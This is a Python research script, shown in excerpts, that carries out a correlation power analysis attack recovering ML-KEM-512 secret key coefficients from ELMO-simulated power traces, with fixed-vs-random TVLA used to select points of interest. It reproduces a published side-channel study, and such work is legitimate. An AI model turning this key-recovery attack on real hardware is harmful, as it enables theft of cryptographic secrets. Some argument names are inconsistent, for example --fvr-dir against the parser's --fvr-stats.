...
POI Selection (FvR / TVLA):
  ELMO's Fixed-vs-Random TVLA run produces per-cycle Welch t-statistics.
  Cycles where |t| > threshold (default 4.5) are candidate POIs.
  If --asmtrace is provided, POIs are further restricted to store
  instructions (str/strh/strb/stm) which correspond to writeback leakage
  in ELMO's operand-forwarding model.
  For each basemul pair, the POI with the highest |t| within that pair's
  estimated time window is selected.  This is entirely non-profiled:
  the known key (sk_bytes from randdata.txt) is used only for final
  verification, not for POI selection.

Attack overview:
  1. Load ELMO traces and randdata.txt.
  2. Load FvR t-statistics from --fvr-dir; compute POI cycle set.
  3. Reconstruct per-trace NTT-domain ciphertext coefficients (â).
  4. For each of the 128 basemul pairs:
       Select the best POI cycle from the FvR stats (blind).
       Enumerate all q ≈ 3329 candidate values for ŝ₂ᵢ.
       For each ŝ₂ᵢ, find the best ŝ₂ᵢ₊₁ via Pearson correlation.
       Best candidate = recovered secret NTT coefficient pair.
  5. Verify recovered key against known sk_cpa from randdata.txt.
...
Usage:
  ...
  --fvr-dir       Path to ELMO FvR output    (default: ../ELMO/output_decaps_fvr)
                  Either a directory (searched for known ELMO stat filenames)
                  or a direct path to the t-statistics text file.
  --fvr-threshold Welch |t| threshold for POI selection (default: 4.5)
  --asmtrace      Path to asmtrace file for store-instruction filtering
                  (default: <fvr-dir>/asmoutput/asmtrace00001.txt)
  ...
  --start-pair    Resume from this basemul pair index (default: 0)
  --end-pair      Stop before this basemul pair index (default: 128)
  --output        Save recovered key to file (default: recovered_key.npy)
  --binary        Traces are binary floats (ELMO compiled with BINARYTRACES)

Notes:
  - Build elmo_test_cpa.c with compile_elmo_profiled.sh.
  ...
  - Runtime: ~5 min per basemul pair on a laptop.
...
def load_randdata(randdata_path: str,
    ...
    """
    Parse ELMO's randdata.txt.  Each line is one byte (hex, 0–ff).
...
# -----------------------------------------------------------------------
# FvR / TVLA — load t-statistics and select POIs
# -----------------------------------------------------------------------

def load_fvr_stats(fvr_stats: str) -> np.ndarray:
    """
    Load ELMO FvR Welch t-statistics (one value per cycle).
    Returns a (T,) float32 array of t-statistics.
    """

    tvla = np.loadtxt(fvr_stats, dtype=np.float32)
    if tvla.ndim != 1:
        raise ValueError(
            f"FvR stats file should be a single column of t-values per cycle, "
            f"got shape {tvla.shape}."
        )
    print(f"      Loaded {len(tvla)} t-statistics.")
    return tvla

def select_poi_cycles(tvla: np.ndarray, threshold: float = 4.5) -> np.ndarray:
    """
    Return cycle indices where |t| > threshold.

    These are candidate Points of Interest: cycles where the power
    consumption differs significantly between fixed and random inputs,
    indicating data-dependent leakage.
    """
    poi = np.where(np.abs(tvla) > threshold)[0]
    return poi

def filter_poi_by_stores(poi_cycles: np.ndarray,
                          tvla: np.ndarray,
                          asm_path: str) -> np.ndarray:
    """
    Restrict poi_cycles to cycles that execute a store instruction
    (str/strh/strb/stm), using an ELMO asmtrace file.

    In ELMO's operand-forwarding leakage model, writeback (store)
    instructions are the primary leakage sites for intermediate values.

    Returns a filtered subset of poi_cycles.  If the asmtrace cannot be
    loaded or yields no matches, the original poi_cycles are returned
    with a warning.
    """
    if not os.path.exists(asm_path):
        print(f"      WARNING: asmtrace not found at '{asm_path}' — "
              f"skipping store-instruction filter.")
        return poi_cycles
    ...
    T_asm = len(asm_lines)
    store_re = re.compile(r'\bst[rmbh]?\b', re.IGNORECASE)

    filtered = []
    for cycle in poi_cycles:
        if cycle >= T_asm:
            continue
        if store_re.search(asm_lines[cycle]):
            filtered.append(cycle)

    filtered = np.array(filtered, dtype=np.intp)

    if len(filtered) == 0:
        print(f"      WARNING: No POI cycles matched store instructions — "
              f"using all {len(poi_cycles)} unfiltered POIs.")
        return poi_cycles

    print(f"      Store-filtered POIs: {len(filtered)} / {len(poi_cycles)} "
          f"cycles kept.")
    return filtered

def find_poi_for_pair_fvr(pair_idx: int,
                           poi_cycles: np.ndarray,
                           tvla: np.ndarray,
                           basemul_region: tuple,
                           n_pairs: int = 128) -> int:
    """
    Select the best POI cycle for a given basemul pair, using FvR
    t-statistics only (no knowledge of the secret key).

    Strategy:
      1. Divide the basemul region into n_pairs equal windows.
      2. Select POI cycles that fall within this pair's window.
      3. Return the cycle with the highest |t| within the window.
      4. If no POI falls in the window, fall back to the global maximum
         |t| across all poi_cycles.

    Returns a single cycle index (int).
    """
    bm_start, bm_end = basemul_region
    window = (bm_end - bm_start) / n_pairs
    w_start = int(bm_start + pair_idx * window)
    w_end   = int(bm_start + (pair_idx + 1) * window)

    # POIs inside this pair's window
    in_window = poi_cycles[(poi_cycles >= w_start) & (poi_cycles < w_end)]

    if len(in_window) > 0:
        best = in_window[np.argmax(np.abs(tvla[in_window]))]
    else:
        # Fallback: closest POI cycle to the window centre
        centre = (w_start + w_end) // 2
        best   = poi_cycles[np.argmin(np.abs(poi_cycles - centre))]
...
def ground_truth_correlation_test(traces, a_ntt, sk_bytes, zetas, vec_idx=0):
    """
    Diagnostic: correlate ground-truth HW(r[0]) with traces for pair 0.
    High correlation confirms the leakage model and trace alignment are correct.
    Uses the known key — for verification only, not for the main attack.
    """
    print("\n[Diagnostic] Ground-truth correlation test (pair 0)")
    ...
    print(f"  Max |Pearson r| = {max_corr:.4f} at cycle {max_idx}")
    if max_corr < 0.1:
        print("  WARNING: very low correlation — check trace alignment "
              "or leakage model.")
    return corr

# -----------------------------------------------------------------------
# CPA — attack one basemul pair
# -----------------------------------------------------------------------
...
def attack_basemul_pair(pair_idx: int,
    ...
    The POI cycle must be supplied externally (e.g. from find_poi_for_pair_fvr)
    so that key material is never used during the attack itself.

    Returns: (best_s0, best_s1, best_corr)
    """
    loop_i   = pair_idx // 2
    second   = (pair_idx % 2 == 1)
    ...
    # Precompute s1 contribution for all candidates: (C, N) int16
    # contrib_s1[c, n] = fqmul(fqmul(a1[n], cand_range[c]), zeta)
    ...
    # Extract trace at the POI, mean-centred: (N, 1)
    trc_f       = traces.astype(np.float32)
    trc_c       = trc_f - trc_f.mean(axis=0)
    trc_var     = (trc_c**2).sum(axis=0) + 1e-10
    trc_c_poi   = trc_c[:, poi:poi+1]        # (N, 1)
    trc_var_poi = trc_var[poi:poi+1]          # (1,)
    ...
    for s0 in cand_range:
        # Contribution of a0 * s0 for all traces: (N,) int16
        c_s0 = montgomery_reduce_vec(
            a0.astype(np.int32) * np.int32(int(s0))
        )

        # r[0] for all (s1_candidate, trace): (C, N) int16
        r0_all = (c_s0.astype(np.int32)[None, :] +
                  contrib_s1_all.astype(np.int32)).astype(np.int16)

        hw = hamming_weight_vec(r0_all)   # (C, N) uint8

        # Pearson correlation at the single POI cycle: (C,)
        ...
        # corr_poi[c] = Pearson(hw[c, :], trace[:, poi])
        corr_poi             = (hw_n @ trc_c_poi).squeeze(1) / np.sqrt(trc_var_poi)  # (C,)
        best_s1_idx          = int(np.abs(corr_poi).argmax())
        local_best           = float(np.abs(corr_poi[best_s1_idx]))

        if local_best > best_corr:
            best_corr = local_best
            best_s0   = int(s0)
            best_s1   = int(cand_range[best_s1_idx])
...
def main():
    parser = argparse.ArgumentParser(
        description='CPA attack on ML-KEM-512 basemul using ELMO traces '
                    'with FvR-based POI selection')
    parser.add_argument('--traces-dir',    default='../ELMO/output/traces',
                        help='Path to ELMO trace folder')
    parser.add_argument('--randdata',      default='../ELMO/output/randdata.txt',
                        help='Path to randdata.txt')
    parser.add_argument('--fvr-stats',     default='../ELMO/output_decaps_fvr/fixedvsrandomtstatistics.txt',
                        help='Fixed vs Random statistics generated by ELMO')
    parser.add_argument('--fvr-asm',       default='../ELMO/output_decaps_fvr/asmoutput/asmtrace00001.txt',
                        help='List of instructions executed by ELMO')
    parser.add_argument('--fvr-threshold', type=float, default=4.5,
                        help='Welch |t| threshold for POI selection '
                             '(default: 4.5)')
    parser.add_argument('--ntt-source',    default='./ntt.c',
                        help='Path to PQClean ntt.c for zeta extraction')
    ...
    parser.add_argument('--end-pair',      type=int,  default=128,
                        help='Stop before this basemul pair index')
    parser.add_argument('--output',        default='recovered_key.npy',
                        help='Save recovered key coefficients to this .npy file')
    parser.add_argument('--binary',        action='store_true',
                        help='Traces are binary float32 (ELMO compiled with '
                             '#define BINARYTRACES)')
    args = parser.parse_args()

    print("=" * 62)
    print("  CPA Attack on ML-KEM-512 polyvec_basemul_acc_montgomery")
    print("  Mujdei et al. (2022) Section 4.3 — FvR POI selection")
    print("=" * 62)

    # -- [1/7] Load zetas from ntt.c ----------------------------------------
    print(f"\n[1/7] Loading zeta table from '{args.ntt_source}'")
    zetas = load_zetas(args.ntt_source)
    print(f"      zetas[64:68] = {zetas[64:68]}  (sanity check)")

    # -- [2/7] Load FvR t-statistics and select POIs ------------------------
    print(f"\n[2/7] Loading FvR t-statistics from '{args.fvr_stats}'")
    tvla = load_fvr_stats(args.fvr_stats)

    poi_cycles = select_poi_cycles(tvla, args.fvr_threshold)
    print(f"      POI cycles with |t| > {args.fvr_threshold}: "
          f"{len(poi_cycles)} / {len(tvla)}")
    if len(poi_cycles) == 0:
        print(f"      WARNING: No POIs found above threshold "
              f"{args.fvr_threshold}. Lowering the threshold may help.")

    # Optional: filter POIs to store instructions using asmtrace
    asm_path = args.fvr_asm
    if asm_path is None:
        # Default: look for asmtrace in the FvR directory
        fvr_base = args.fvr_dir if os.path.isdir(args.fvr_dir) \
                   else os.path.dirname(args.fvr_dir)
        asm_path = os.path.join(fvr_base, 'asmoutput', 'asmtrace00001.txt')

    if os.path.exists(asm_path):
        print(f"      Filtering POIs by store instructions: '{asm_path}'")
        poi_cycles = filter_poi_by_stores(poi_cycles, tvla, asm_path)
    else:
        print(f"      (asmtrace not found at '{asm_path}' — "
              f"skipping store-instruction filter)")

    # -- [3/7] Load traces --------------------------------------------------
    print(f"\n[3/7] Loading {args.num_traces} ELMO traces from '{args.traces_dir}'")
    traces = load_traces(args.traces_dir, args.num_traces, args.binary)
    N, T   = traces.shape

    # Sanity: check FvR stats length vs trace length
    if len(tvla) != T:
        print(f"      WARNING: FvR stats have {len(tvla)} entries but traces "
              f"have {T} cycles. POI selection may be misaligned.")

    # -- [4/7] Load randdata (sk and ciphertexts) --------------------------
    print(f"\n[4/7] Parsing randdata from '{args.randdata}'")
    sk_bytes, ct_array = load_randdata(args.randdata, N)
    print(f"      sk_cpa: {INDCPA_SK_BYTES} bytes  |  "
          f"ct array: {ct_array.shape}")

    # -- [5/7] Precompute NTT-domain ciphertext coefficients ---------------
    print(f"\n[5/7] Decompressing and computing NTT of ciphertexts ...")
    t0 = time.time()
    ...
    # -- [6/7] Locate basemul region and pre-select per-pair POIs ----------
    print(f"\n[6/7] Locating basemul region and pre-computing POIs ...")
    basemul_region = find_basemul_region(traces, verbose=True)

    if len(poi_cycles) == 0:
        # Hard fallback: evenly spaced cycles within basemul region
        bm_s, bm_e = basemul_region
        step = max(1, (bm_e - bm_s) // 128)
        poi_cycles = np.arange(bm_s, bm_e, step, dtype=np.intp)
        print(f"      FALLBACK: using {len(poi_cycles)} evenly-spaced "
              f"cycles as POIs (no FvR hits).")

    pair_pois = [
        find_poi_for_pair_fvr(p, poi_cycles, tvla, basemul_region)
        for p in range(128)
    ]
    print(f"      POI cycles for pairs 0–3: {pair_pois[:4]}")

    # Diagnostics (uses known key — verification only)
    verify_python_math(sk_bytes, ct_array[0], zetas, args.vec_idx)
    ground_truth_correlation_test(traces, a_ntt, sk_bytes, zetas, args.vec_idx)
    ...
    print(f"      Each pair: q={KYBER_Q} s0 candidates × q s1 candidates")
    print()
    ...
    for pair in range(args.start_pair, args.end_pair):
        ...
        np.save(args.output, recovered)  # checkpoint after every pair
    ...
    if match > 0.9:
        ...
        print("  ~ Partial success — try more traces or adjust FvR threshold")
    else:
        print("  ✗ Attack failed — check trace quality / POI alignment")

    print(f"\n  Recovered key saved to: {args.output}")

    # First few coefficients side-by-side
    sk_ntt = polyvec_frombytes(bytes(sk_bytes))
    print("\n  First 8 coefficients (recovered | known | match):")
    for j in range(8):
        r    = int(recovered[j])
